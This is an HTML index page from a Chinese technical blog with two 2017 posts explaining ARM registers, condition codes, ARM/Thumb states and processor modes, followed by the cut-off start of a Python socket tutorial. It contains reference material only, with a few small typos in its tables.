<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/8/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/8/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/08/ARM寄存器结构小记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/08/ARM寄存器结构小记/" itemprop="url">ARM寄存器结构小记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-08T22:43:17+08:00">
                2017-09-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>ARM处理器共有37个寄存器，被分为若干个组，这些寄存器包括：</p>
<ul>
<li>31个通用寄存器，包括未分组寄存器R0-R7、分组寄存器R8-R14和程序计数器（ PC 指针），均为32位的寄存器。</li>
<li>6个状态寄存器，包括程序状态寄存器 CPSR 和5个物理状态寄存器 SPSR （用以异常发生时保存 CPSR 的值，异常退出时恢复 CPSR ）。 这些状态寄存器用以标识 CPU 的工作状态及程序的运行状态，均为32位。</li>
</ul>
<p>具体如下表所示：</p>
<table>
<thead>
<tr>
<th>用户模式 usr</th>
<th>系统模式 sys</th>
<th>特权模式 svc</th>
<th>中止模式 abt</th>
<th>未定义指令模式 und</th>
<th>外部中断模式 irq</th>
<th>快速中断模式 fiq</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
</tr>
<tr>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
</tr>
<tr>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
</tr>
<tr>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
</tr>
<tr>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
</tr>
<tr>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
</tr>
<tr>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
</tr>
<tr>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8_fiq</td>
</tr>
<tr>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9_fiq</td>
</tr>
<tr>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10_fiq</td>
</tr>
<tr>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11_fiq</td>
</tr>
<tr>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12_fiq</td>
</tr>
<tr>
<td>R13(SP)</td>
<td>R13</td>
<td>R13_svc</td>
<td>R13_abt</td>
<td>R13_und</td>
<td>R13_inq</td>
<td>R13_fiq</td>
</tr>
<tr>
<td>R14(LR)</td>
<td>R14</td>
<td>R14_svc</td>
<td>R14_abt</td>
<td>R14_und</td>
<td>R14_inq</td>
<td>R14_fiq</td>
</tr>
<tr>
<td>PC(R15)</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
</tr>
<tr>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
</tr>
<tr>
<td></td>
<td></td>
<td>SPSR_svc</td>
<td>SPSR_abt</td>
<td>SPSR_und</td>
<td>SPSR_inq</td>
<td>SPSR_fiq</td>
</tr>
</tbody>
</table>
<h2 id="未分组寄存器-R0-R7："><a href="#未分组寄存器-R0-R7：" class="headerlink" title="未分组寄存器 R0 - R7："></a>未分组寄存器 R0 - R7：</h2><p>对于未分组寄存器，它们没有被系统用于特别的用途，因此任何可采用通用寄存器的应用场合都可以使用未分组寄存器。<br>但需要注意一点，未分组寄存器不会因为处理器模式的改变而更改指向的寄存器，因此在所有的处理器模式下未分组寄存器都指向同一个寄存器，当中断或异常处理造成处理器模式转换的时候，由于不同的处理器模式使用了相同的物理寄存器，这就有可能造成寄存器中的数据被破坏。 </p>
<h2 id="分组寄存器-R8-R14"><a href="#分组寄存器-R8-R14" class="headerlink" title="分组寄存器 R8 - R14"></a>分组寄存器 R8 - R14</h2><p>对于分组寄存器，它们每一次所访问的物理寄存器和处理器当前的运行模式有关。例如在快速中断模式 fiq下R8-R12访问寄存器 R8_fiq-R12_fiq ；而在其他模式下又访问 R8_usr-R12_usr 。因此它们每个对应着两个不同的寄存器。</p>
<p>对于R13（SP）、R14（LR）来说，每个寄存器对应着6个不同的物理寄存器，其中的一个是用户模式与系统模式共用，另外5个物理寄存器对应于其他5种不同的运行模式。采用以下的记号来区分不同的物理寄存器：<br>R13_&lt; mode &gt;<br>R14_&lt; mode &gt;<br>其中，mode为以下几种模式之一：usr、fiq、irq、svc、abt、und。</p>
<h3 id="R13（SP）"><a href="#R13（SP）" class="headerlink" title="R13（SP）"></a>R13（SP）</h3><p>寄存器 R13 在 ARM 指令还有着一个非常重要的作用，通常他被用作堆栈指针，当然这只是一种习惯用法，用户也可以使用其他的寄存器作为堆栈指针，但在Thumb指令集中，某些指令强制性地要求使用R13作为堆栈指针。</p>
<p>由于处理器的每种运行模式均有自己福利的物理寄存器R13，使其指向该运行模式下的栈空间，这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈恢复，采用这种方式可以保证异常发生后程序的正常执行。</p>
<h3 id="R14（LR）"><a href="#R14（LR）" class="headerlink" title="R14（LR）"></a>R14（LR）</h3><p>R14 也称作子程序连接寄存器（Subroutine Link Register）或连接寄存器 LR 。当执行 BL 子程序调用指令时，R14 中得到 R15 （程序计数器PC）的备份。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x00008d68 &lt;+44&gt;:    bl  0x8cd4 &lt;func&gt;</div><div class="line">0x00008d6c &lt;+48&gt;:    ...</div><div class="line">0x00008d70 &lt;+52&gt;:    ...123</div></pre></td></tr></table></figure>
<p>通常情况下，在汇编代码中不会出现 R14 中产生 PC 备份的指令语句。可以简单的理解为在执行调用的同时，将当前 PC 的指向的值 0x00008d70 减去一条指令的长度，这里是ARM工作状态，指令长度为 0x00000004，并交由R14保存。减去一条指令的原因很简单，不减的话返回的时候中间 0x00008d6c 处的那条指令就被跳过了。</p>
<font color="#f00">（当前执行的是 0x00008d68 处的指令，0x00008d6c 处的指令处于译码阶段，0x00008d70 的指令处于取指阶段，PC总是指向取指阶段的指令。关于  ARM 处理器的流水线机制和 PC 指向的值 详见下文。） </font>

<p> 其他情况下，R14 也可以用作通用寄存器。与之类似，当发生中断或异常时，对应的分组寄存器 R14_svc、R14_irq、R14_fiq、R14_abt 和 R14_und 用来保存 R15 的返回值。</p>
<p>每一种处理器模式在自己的物理 R14 中存放当前子程序的返回地址。当通过BL、BX 等指令调用子程序时，R14就被设置成该子程序的返回地址。例如有汇编指令如下：</p>
<ul>
<li>执行以下任意一条指令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MOV PC，LR</div><div class="line">BX LR12</div></pre></td></tr></table></figure>
<ul>
<li>在子程序入口处使用以下指令将R14存入堆栈：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">STMFD SP！,&#123;&lt;Regs&gt;,LR&#125;1</div></pre></td></tr></table></figure>
<ul>
<li>对应的，使用以下指令可以完成子程序返回：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LDMFD SP！,&#123;&lt;Regs&gt;,PC&#125;1</div></pre></td></tr></table></figure>
<p>当发生异常中断的时候，该模式下的特定物理R14被设置成该异常模式将要返回的地址。</p>
<h3 id="R15（PC）"><a href="#R15（PC）" class="headerlink" title="R15（PC）"></a>R15（PC）</h3><p>介绍R15之前先简单了解一下 ARM 处理器的是流水线机制。 ARM7 处理器采用3级流水线来增加处理器指令流的速度，能提供 0.9MIPS/MHz 的指令处理速度。</p>
<p>ARM7 的流水线有3个阶段，因此指令分3个阶段执行。<br>⑴ 取指从存储器装载一条指令<br>⑵ 译码识别将要被执行的指令<br>⑶ 执行处理指令并将结果写会寄存器</p>
<p>对于x86处理器来说，只有完成一条指令的读取和执行后，才会执行下一条指令。这样， PC 始终指向的正在“执行”的指令。<br>而对于 ARM7 来说因为是3级流水线，所以把指令的处理分为了上面所述的3个阶段。所以处理时实际是这样的： ARM 正在执行第1条指令的同时对第2条指令进行译码，并将第3条指令从存储器中取出。因此 ARM7 流水线只有在取第4条指令时，第1条指令才算完成执行。继而 ARM 的 PC 寄存器永远指向当前执行的指令后的第二条指令，即处于取指阶段的指令。</p>
<p>另外，在ARM状态下，最低的两位[1:0]为0，其他位[31:2]用于保存PC；在Thumb状态下，最低位[0]为0，其他位 [31:1]用于保存PC；所以 R15（PC）虽然可以用作通用寄存器，但是有一些指令在使用R15时有一些特殊限制，当违反了这些限制时，程序的执行结果是未知的。</p>
<h3 id="R16（CPSR）"><a href="#R16（CPSR）" class="headerlink" title="R16（CPSR）"></a>R16（CPSR）</h3><p>寄存器R16用作当前程序状态寄存器 CPSR （Current Program Status Register），可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。</p>
<p>每一种运行模式下又都有一个专用的物理状态寄存器，称为备份的程序状态寄存器 SPSR （Saved Program Status Register），当异常发生时， SPSR 用于保存 CPSR 的当前值，从异常退出时则可由 SPSR 来恢复 CPSR 。</p>
<p>由于用户模式和系统模式不属于异常模式，他们没有 SPSR ，当在这两种模式下访问 SPSR ，结果是未知的。</p>
<h3 id="执行条件标志位"><a href="#执行条件标志位" class="headerlink" title="执行条件标志位"></a>执行条件标志位</h3><p>ARM 的执行条件与 x86 下面的标志位有些类似，系统通过对这些标志位的判断来确定是否满足执行条件。几乎所有的 ARM 指令都包含一个4位的条件码，位于指令的最高4位。条件码共有16种，每种条件码可用两个字符表示，这两个字符可以添加在指令助记符的后面和指令同时使用。</p>
<p>例如，跳转指令 B 可以加上后缀 EQ 变成 BEQ 表示“相同则跳转”，即当 CPSR 中的Z标志置位时发生跳转。在16种条件标志码中，只有15种可以使用，如下表所示。第十六种（1111）为系统保留，暂时不能使用。</p>
<table>
<thead>
<tr>
<th>编 码</th>
<th>条件助记符</th>
<th>标志位</th>
<th>含 义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0000</td>
<td>EQ</td>
<td>Z=1</td>
<td>相等</td>
</tr>
<tr>
<td>0001</td>
<td>NE</td>
<td>Z=0</td>
<td>不相等</td>
</tr>
<tr>
<td>0010</td>
<td>CS</td>
<td>C=1</td>
<td>无符号大于或等于</td>
</tr>
<tr>
<td>0011</td>
<td>CC</td>
<td>C=0</td>
<td>无符号小于</td>
</tr>
<tr>
<td>0100</td>
<td>MI</td>
<td>N=1</td>
<td>负值</td>
</tr>
<tr>
<td>0101</td>
<td>PL</td>
<td>N=0</td>
<td>正值或 0</td>
</tr>
<tr>
<td>0110</td>
<td>VS</td>
<td>V=1</td>
<td>溢出</td>
</tr>
<tr>
<td>0111</td>
<td>VC</td>
<td>V=0</td>
<td>无溢出</td>
</tr>
<tr>
<td>1000</td>
<td>HI</td>
<td>C=1 且 Z=0</td>
<td>无符号大于</td>
</tr>
<tr>
<td>1001</td>
<td>LS</td>
<td>C=0 且 Z=1</td>
<td>无符号小于或等于</td>
</tr>
<tr>
<td>1010</td>
<td>GE</td>
<td>N 和 V 相同</td>
<td>有符号大于或等于</td>
</tr>
<tr>
<td>1011</td>
<td>LT</td>
<td>N 和 V 不相同</td>
<td>有符号小于</td>
</tr>
<tr>
<td>1100</td>
<td>GT</td>
<td>Z=0 且 N 等于 V</td>
<td>有符号大于</td>
</tr>
<tr>
<td>1101</td>
<td>LE</td>
<td>Z=1 且 N 不等于 V</td>
<td>有符号小于或等于</td>
</tr>
<tr>
<td>1110</td>
<td>AL</td>
<td>任意</td>
<td>无条件执行（不推荐使用）</td>
</tr>
<tr>
<td>1111</td>
<td>NV</td>
<td>任意</td>
<td>从不执行（不要使用）</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/08/ARM状态结构小记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/08/ARM状态结构小记/" itemprop="url">ARM状态结构小记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-08T22:05:16+08:00">
                2017-09-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>在系统学习ARM寄存器结构和功能之前，有必要先了解一下ARM的工作模式和工作状态。</p>
</blockquote>
<h2 id="一、-ARM的工作状态"><a href="#一、-ARM的工作状态" class="headerlink" title="一、 ARM的工作状态"></a>一、 ARM的工作状态</h2><p>两种状态为：</p>
<ul>
<li>ARM状态（32位）</li>
<li>Thumb状态（16位）</li>
</ul>
<p>用BX Rn指令来进行两种状态的切换：<br>其中BX是跳转指令，Rn是寄存器，如果Rn的位0为1（最低位），则进入Thumb状态；如果Rn的位为0，这进入ARM状态。（ARM指令的后两位始终为0，没有被使用；而Thumb指令的后一位始终为0，没有被使用，因此采用位0来表示ARM指令与Thumb指令的切换标志位。）</p>
<p>例如下面两个指令就可以实现从ARM状态切换到Thumb状态，第一条指令将r6寄存器最低位置为1，接着 <code>bx  r6</code> 就切换到了Thumb状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">……</div><div class="line">0x00008cfc &lt;+12&gt;:    add r6, pc, #1</div><div class="line">0x00008d00 &lt;+16&gt;:    bx  r6</div><div class="line">0x00008d04 &lt;+20&gt;:    ...</div><div class="line">0x00008d06 &lt;+22&gt;:    ...</div><div class="line">0x00008d08 &lt;+24&gt;:    ...</div><div class="line">……1234567</div></pre></td></tr></table></figure>
<p>注：ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容；ARM处理器在处理异常时，不过处理器处于什么状态，则都将切换到ARM状态。</p>
<p>对于 ARM 指令来说，所有的指令长度都是 32 位，并且执行周期大多为单周期，指令都是有条件执行的。<br>而 Thumb 指令的特点如下：</p>
<ul>
<li>指令执行条件经常不回使用。</li>
<li>源寄存器与目标寄存器经常是相同的。</li>
<li>使用的寄存器数量比较少。</li>
<li>常数的值比较小。</li>
<li>内核中的桶式移动器（barrel shifter）经常是不使用的。</li>
</ul>
<p>也就是说 16 位的 Thumb 指令一般可以完成 和 32 位 ARM 指令相同的任务。Thumb指令是ARM指令的子集，只要遵循一定的调用规则就可以互相调用。<br>Thumb指令与ARM指令的时间效率和空间效率关系为：</p>
<ul>
<li>存储空间约为ARM代码的60％～70％</li>
<li>指令数比ARM代码多约30％～40％</li>
<li>存储器为32位时ARM代码比Thumb代码快约40％</li>
<li>存储器为16位时Thumb比ARM代码快约40～50％</li>
<li>使用Thumb代码，存储器的功耗会降低约30％</li>
</ul>
<h2 id="二、-ARM的工作模式"><a href="#二、-ARM的工作模式" class="headerlink" title="二、 ARM的工作模式"></a>二、 ARM的工作模式</h2><p>七种工作模式为：</p>
<ul>
<li>usr 用户模式：正常用户模式，程序正常执行模式</li>
<li>sys 系统模式：(基本上等同于usr)（System）运行特权操作系统任务</li>
<li>svc 特权模式：（Supervisor）也叫操作系统保护模式，处理软件中断swi  reset</li>
<li>abt 中止模式：（Abort mode）{数据、指令} 处理存储器故障、实现虚拟存储器和存储器保护</li>
<li>und 未定义指令模式：（Undefined）处理未定义的指令陷阱，支持硬件协处理器的软件仿真</li>
<li>irq 外部中断模式：处理普通中断</li>
<li>fiq 快速中断模式：（Fast Interrupt Request）处理快速中断，支持高速数据传送或通道处理</li>
</ul>
<p>上述七种工作模式中，除了用户模式之外的其他6种处理器模式称为特权模式。</p>
<p>特权模式下，程序可以访问所有的系统资源，也可以任意地进行处理器模式的切换。</p>
<p>特权模式中，除系统模式外，其他5种模式又称为异常模式。</p>
<p>大多数的用户程序运行在用户模式下，此时，应用程序不能够访问一些受操作系统保护的系统资源，应用程序也不能直接进行处理器模式的切换。</p>
<p>用户模式下，当需要进行处理器模式切换时，应用程序可以产生异常处理，在异常处理中进行处理器模式的切换。</p>
<h2 id="三、-关于状态和模式的切换"><a href="#三、-关于状态和模式的切换" class="headerlink" title="三、 关于状态和模式的切换"></a>三、 关于状态和模式的切换</h2><p>处理器模式可以通过软件进行切换，也可以通过外部中断或者异常处理过程进行切换。</p>
<p>当应用程序发生异常中断时，处理器进入相应的异常模式。在每一种异常模式下都有一组寄存器，供相应的异常处理程序使用，这样就可以保证在进入异常模式时，用户模式下的寄存器不被破坏。</p>
<p>系统模式并不是通过异常进入的，它和用户模式具有完全一样的寄存器。但是系统模式属于特权模式，可以访问所有的系统资源，也可以直接进行处理器模式切换。它主要供操作系统任务使用。通常操作系统的任务需要访问所有的系统资源，同时该任务仍然使用用户模式的寄存器组，而不是使用异常模式下相应的寄存器组，这样可以保证当异常中断发生时任务状态不被破坏。</p>
<p>Thumb指令低密度及窄存储器时性能高的特点使得其在大多数基于 C 代码的系统汇中有非常广泛的应用，但是有些场合中系统只能使用 ARM 指令，比如：</p>
<ol>
<li>如果对于速度有比较高的要求，ARM指令在宽存储器中会提供更高的性能。</li>
<li>某些功能只能由 ARM 指令来实现，例如访问 CPSR 寄存器来使能/禁止 中断或改变处理器工作模式；访问协处理器CP15；执行 C 代码不支持的 DSP 算术指令；异常中断（Exception）处理。</li>
</ol>
<p>另外，在进入异常中断后，内核会自动切换到 ARM 状态。即在异常中断处理程序人口的一些指令是ARM指令，然后根据需要，程序可以切换到 Thumb 工作状态，在异常中断处理程序返回前，程序在切换到 ARM 工作状态。</p>
<p>注：当处理器处于Thumb状态时发生异常（如irq、fiq、und、abt、svc等），则异常处理返回时，自动切换到Thumb状态。需要了解的是，ARM 处理器总是 从 ARM 工作状态开始执行的。因此，如果要在调试器重新运行 Thumb 程序，必须为 该 Thumb 程序添加一个 ARM程序头，然后再切换到Thumb工作状态调用该 Thumb程序。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/python-socket编程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/python-socket编程/" itemprop="url">python socket编程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T22:50:23+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Python 提供了两个基本的 socket 模块。</p>
<p>   第一个是 Socket，它提供了标准的 BSD Sockets API。</p>
<p>   第二个是 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</p>
<p>下面讲的是Socket模块功能</p>
<h3 id="1、Socket-类型"><a href="#1、Socket-类型" class="headerlink" title="1、Socket 类型"></a>1、Socket 类型</h3><p>套接字格式：</p>
<p>socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。</p>
<table>
<thead>
<tr>
<th><strong>socket类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>socket.AF_UNIX</td>
<td>只能够用于单一的Unix系统进程间通信</td>
</tr>
<tr>
<td>socket.AF_INET</td>
<td>服务器之间网络通信</td>
</tr>
<tr>
<td>socket.AF_INET6</td>
<td>IPv6</td>
</tr>
<tr>
<td>socket.SOCK_STREAM</td>
<td>流式socket , for TCP</td>
</tr>
<tr>
<td>socket.SOCK_DGRAM</td>
<td>数据报式socket , for UDP</td>
</tr>
<tr>
<td>socket.SOCK_RAW</td>
<td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</td>
</tr>
<tr>
<td>socket.SOCK_SEQPACKET</td>
<td>可靠的连续数据包服务</td>
</tr>
<tr>
<td>创建TCP Socket：</td>
